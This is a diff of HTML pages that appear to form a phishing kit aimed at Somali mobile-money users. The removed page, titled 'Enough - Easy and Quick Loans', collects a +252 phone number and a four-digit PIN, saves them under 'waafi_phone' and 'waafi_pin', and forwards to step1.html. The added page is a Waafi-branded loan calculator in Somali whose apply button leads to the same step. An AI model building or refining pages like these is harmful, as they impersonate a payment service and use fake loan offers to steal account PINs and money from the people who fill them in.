@@ -1,77 +1,41 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enough - Easy and Quick Loans</title>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
-body { background:#fff; }
-.header { background: linear-gradient(135deg, #b8e600, #00B347); padding:40px 20px; text-align:center; color:white; border-bottom-left-radius:50% 20%; border-bottom-right-radius:50% 20%; }
-.header h1 { font-size:36px; opacity:0.3; }
-.header p { font-size:16px; margin-top:5px; }
-.container { padding:30px 20px; text-align:center; max-width:400px; margin:auto; }
-h2 { color:#555; font-weight:400; margin-bottom:25px; }
-.phone-box { border:2px solid #00B347; border-radius:12px; padding:15px; display:flex; align-items:center; gap:10px; margin-bottom:25px; }
-.flag { font-size:24px; }
-.phone-box input { border:none; outline:none; font-size:18px; width:100%; }
-label { color:#777; margin-bottom:15px; display:block; }
-.pin-box { display:flex; justify-content:center; gap:15px; margin-bottom:10px; }
-.pin-box input { width:55px; height:55px; border:2px solid #00B347; border-radius:12px; text-align:center; font-size:24px; outline:none; }
-.subtext { color:#999; font-size:14px; margin-bottom:25px; }
-.btn { width:100%; padding:16px; border:none; border-radius:10px; font-size:18px; font-weight:bold; background:#ccc; color:white; }
-.btn.active { background: linear-gradient(90deg, #b8e600, #00B347); cursor:pointer; }
-.footer { background: linear-gradient(135deg, #b8e600, #00B347); padding:40px 20px; text-align:center; color:white; border-top-left-radius:50% 20%; border-top-right-radius:50% 20%; margin-top:40px; }
-.footer h1 { font-size:32px; }
-.footer p { font-size:14px; margin:5px 0; }
-.footer .version { font-size:12px; margin-top:10px; opacity:0.8; }
-.footer a { color:white; text-decoration:underline; }
-</style>
-</head>
-<body>
-
-<div class="header"><h1>Enough</h1><p>Easy and Quick Loans</p></div>
-
+<!DOCTYPE html><html lang="so"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Waafi</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}body{background:#f5f5f5}
+.header{background:linear-gradient(90deg,#a8e063,#00B347);padding:15px;color:white;font-weight:bold;font-size:22px;display:flex;justify-content:space-between}
+.container{padding:20px;max-width:600px;margin:auto}.card{background:white;padding:20px;border-radius:15px;box-shadow:0 2px 10px rgba(0,0,0,0.1);margin-bottom:20px;text-align:center}
+.card h2{margin-bottom:8px} .sub{color:#666;font-size:14px;margin-bottom:20px}
+.calc{background:#f9f9f9;padding:20px;border-radius:12px;text-align:left}
+.row{display:flex;justify-content:space-between;margin:15px 0;font-weight:600}
+input[type=range]{width:100%} .amount{color:#00B347;font-size:18px}
+.btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin:20px 0}
+.feature{display:flex;align-items:center;gap:15px;margin:15px 0} .feature b{color:#333}</style>
+</head><body>
+<div class="header">Waafi <span>☰</span></div>
 <div class="container">
-  <h2>Gal</h2>
-  <div class="phone-box">
-    <span class="flag">🇸🇴</span><span>+252</span>
-    <input id="phone" type="number" placeholder="719389953" maxlength="9">
-  </div>
-  <label>Enter your PIN.</label>
-  <div class="pin-box">
-    <input type="password" maxlength="1" oninput="moveNext(this,0)">
-    <input type="password" maxlength="1" oninput="moveNext(this,1)">
-    <input type="password" maxlength="1" oninput="moveNext(this,2)">
-    <input type="password" maxlength="1" oninput="moveNext(this,3)">
-  </div>
-  <p class="subtext">Can you be executed?</p>
-  <button class="btn" id="galBtn" onclick="login()">GAL</button>
-</div>
+<div class="card">
+<h2>Hel Amaah Deg ah</h2>
+<p class="sub">Ansixid degdeg ah • Qiimo tartan ah • Muddooyin dabacsan</p>
+<div class="calc">
+<h3>Xisaabinta Amaahda</h3>
+<div class="row"><span>Qaddarka Amaahda</span><span class="amount" id="amount">$1,000</span></div>
+<input type="range" id="loanRange" min="100" max="5000" value="1000" oninput="update()">
+<div class="row" style="font-size:12px;color:#999"><span>$100</span><span>$5,000</span></div>
 
-<div class="footer">
-  <h1>Enough</h1><p>Easy and Quick Loans</p>
-  <p class="version">v2.1.3P</p>
-  <p>By entering you agree to <a href="#">the Terms and Conditions.</a></p>
-</div>
+<div class="row"><span>Muddada Amaahda</span><span class="amount" id="months">12 bilood</span></div>
+<input type="range" id="monthRange" min="6" max="60" value="12" step="6" oninput="update()">
+<div class="row" style="font-size:12px;color:#999"><span>6 bilood</span><span>60 bilood</span></div>
 
-<script>
-const inputs = document.querySelectorAll('.pin-box input');
-const btn = document.getElementById('galBtn');
-function moveNext(el, index) { if(el.value.length === 1 && index < 3) inputs[index + 1].focus(); checkBtn(); }
-function checkBtn() {
-  const phone = document.getElementById('phone').value;
-  const pin = Array.from(inputs).map(i=>i.value).join('');
-  if(phone.length >= 9 && pin.length === 4) { btn.classList.add('active'); btn.disabled = false; } 
-  else { btn.classList.remove('active'); btn.disabled = true; }
-}
-inputs.forEach(i=>i.addEventListener('input', checkBtn));
-document.getElementById('phone').addEventListener('input', checkBtn);
-function login() {
-  localStorage.setItem('waafi_phone', document.getElementById('phone').value);
-  localStorage.setItem('waafi_pin', Array.from(inputs).map(i=>i.value).join(''));
-  window.location.href = 'step1.html';
-}
-</script>
-</body>
-</html>
+<div style="background:white;padding:15px;border-radius:10px;margin-top:15px;display:flex;justify-content:space-between">
+<span>Lacagta Bisha</span><span class="amount" id="monthly">$98.33</span></div>
+</div>
+<button class="btn" onclick="location.href='step1.html'">CODSO HADDA</button>
+<div class="feature">⚡ <div><b>Ansixid Degdeg ah</b><div style="color:#999;font-size:13px">24 saac gudahood</div></div></div>
+<div class="feature">💰 <div><b>Qiimo Yar</b><div style="color:#999;font-size:13px">Laga bilaabo 18%</div></div></div>
+</div></div>
+<script>function update(){
+let a=loanRange.value; let m=monthRange.value;
+amount.innerText='$'+Number(a).toLocaleString();
+months.innerText=m+' bilood';
+let monthly=(a/m*1.18).toFixed(2);
+document.getElementById('monthly').innerText='$'+monthly;
+}</script></body></html>
